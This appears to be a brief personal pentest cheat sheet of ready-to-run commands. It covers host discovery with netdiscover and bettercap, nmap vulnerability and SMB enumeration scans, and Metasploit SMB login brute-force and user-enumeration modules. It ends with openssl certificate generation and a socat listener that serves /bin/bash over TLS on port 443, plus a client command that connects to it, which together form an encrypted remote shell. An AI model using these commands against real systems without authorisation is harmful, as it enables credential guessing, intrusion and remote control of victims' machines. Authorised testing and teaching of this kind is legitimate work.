Pentest commands
========================

## Network enumeration

netdiscover -i eth0 -P -N | cut -d ' ' -f 2

bettercap -eval "net.probe on; sleep 3;q" | cut -d' ' -f 4 | grep "\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\).\([0-9]\{1,3\}\)" | sed $'s/\[[0-9]{1}m//g' > ips.txt


## Network scanning


### nmap

nmap -iL ips.txt -sV --version-intensity 9 --script vuln

nmap -iL ips.txt --script smb-os-discovery -p 445,139

nmap -iL ips.txt --script smb-enum-shares -p 445,139

msfconsole

### smb_login

use auxiliary/scanner/smb/smb_login

set USER_FILE /root/owncloud/Tools_Utilities/tools/linux/fuzzdb

set USERPASS_FILE /root/owncloud/Tools_Utilities/tools/linux/fuzzdb

### smb_enumusers

use auxiliary/scanner/smb/smb_enumusers

### enum4linux


## Tools

### socat

Gerando certificado para fechar conexÃµes criptografadas

req: initiate a new certificate signing request
-newkey: generate a new private key
rsa:2048: use RSA encryption with a 2,048-bit key length.
-nodes: store the private key without passphrase protection
-keyout: save the key to a file
-x509: output a self-signed certificate instead of a certificate request
-days: set validity period in days
-out: save the certificate to a file

1) listener

    openssl req -newkey rsa:2048 -nodes -keyout cert.key -x509 -days 362 -out cert.crt
    cat cert.key cert.crt > cert.pem
    
    socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:/bin/bash
 
 2) client
 
    socat - OPENSSL:192.168.1.26:443,verify=0